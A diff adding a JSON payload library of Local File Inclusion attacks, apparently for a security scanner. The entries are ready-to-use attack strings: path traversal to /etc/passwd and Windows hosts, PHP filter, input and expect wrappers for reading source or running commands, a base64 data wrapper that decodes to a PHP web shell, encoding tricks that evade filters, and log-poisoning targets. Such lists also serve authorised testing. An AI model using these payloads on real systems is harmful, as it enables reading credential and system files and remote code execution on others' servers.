@@ -1,0 +1,247 @@
+{
+    "category": "LFI",
+    "description": "Local File Inclusion payloads for reading local files",
+    "payloads": [
+        {
+            "id": "lfi-basic-001",
+            "title": "etc/passwd Linux",
+            "payload": "../../../etc/passwd",
+            "category": "LFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "linux",
+                "passwd"
+            ],
+            "notes": "Basic path traversal to /etc/passwd",
+            "source": "github"
+        },
+        {
+            "id": "lfi-basic-002",
+            "title": "etc/passwd Deep",
+            "payload": "....//....//....//....//etc/passwd",
+            "category": "LFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "medium",
+            "tags": [
+                "basic",
+                "linux",
+                "deep"
+            ],
+            "notes": "Double dot bypass",
+            "source": "github"
+        },
+        {
+            "id": "lfi-basic-003",
+            "title": "Windows hosts",
+            "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "category": "LFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "windows",
+                "hosts"
+            ],
+            "notes": "Windows hosts file",
+            "source": "github"
+        },
+        {
+            "id": "lfi-wrapper-001",
+            "title": "PHP Filter Base64",
+            "payload": "php://filter/convert.base64-encode/resource=index.php",
+            "category": "LFI",
+            "subcategory": "PHP Wrapper",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "medium",
+            "tags": [
+                "php",
+                "wrapper",
+                "base64"
+            ],
+            "notes": "Read PHP source code as base64",
+            "source": "github"
+        },
+        {
+            "id": "lfi-wrapper-002",
+            "title": "PHP Input",
+            "payload": "php://input",
+            "category": "LFI",
+            "subcategory": "PHP Wrapper",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "php",
+                "wrapper",
+                "input"
+            ],
+            "notes": "Read POST data, can lead to RCE",
+            "source": "github"
+        },
+        {
+            "id": "lfi-wrapper-003",
+            "title": "Data Wrapper",
+            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+            "category": "LFI",
+            "subcategory": "PHP Wrapper",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "php",
+                "wrapper",
+                "data"
+            ],
+            "notes": "Base64 encoded PHP shell",
+            "source": "github"
+        },
+        {
+            "id": "lfi-wrapper-004",
+            "title": "Expect Wrapper",
+            "payload": "expect://id",
+            "category": "LFI",
+            "subcategory": "PHP Wrapper",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "php",
+                "wrapper",
+                "expect"
+            ],
+            "notes": "Execute commands via expect://",
+            "source": "github"
+        },
+        {
+            "id": "lfi-bypass-001",
+            "title": "Null Byte",
+            "payload": "../../../etc/passwd%00",
+            "category": "LFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "null",
+                "legacy"
+            ],
+            "notes": "Null byte bypass (PHP < 5.3.4)",
+            "source": "github"
+        },
+        {
+            "id": "lfi-bypass-002",
+            "title": "Double Encoding",
+            "payload": "..%252f..%252f..%252fetc/passwd",
+            "category": "LFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "encoding",
+                "double"
+            ],
+            "notes": "Double URL encoding",
+            "source": "github"
+        },
+        {
+            "id": "lfi-bypass-003",
+            "title": "UTF-8 Encoding",
+            "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+            "category": "LFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "utf8",
+                "overlong"
+            ],
+            "notes": "UTF-8 overlong encoding",
+            "source": "github"
+        },
+        {
+            "id": "lfi-log-001",
+            "title": "Apache Access Log",
+            "payload": "/var/log/apache2/access.log",
+            "category": "LFI",
+            "subcategory": "Log Poisoning",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "log",
+                "apache",
+                "poisoning"
+            ],
+            "notes": "Include Apache access log for RCE",
+            "source": "github"
+        },
+        {
+            "id": "lfi-log-002",
+            "title": "Nginx Access Log",
+            "payload": "/var/log/nginx/access.log",
+            "category": "LFI",
+            "subcategory": "Log Poisoning",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "log",
+                "nginx",
+                "poisoning"
+            ],
+            "notes": "Include Nginx access log",
+            "source": "github"
+        },
+        {
+            "id": "lfi-log-003",
+            "title": "SSH Auth Log",
+            "payload": "/var/log/auth.log",
+            "category": "LFI",
+            "subcategory": "Log Poisoning",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "log",
+                "ssh",
+                "auth"
+            ],
+            "notes": "SSH authentication log poisoning",
+            "source": "github"
+        }
+    ]
+}
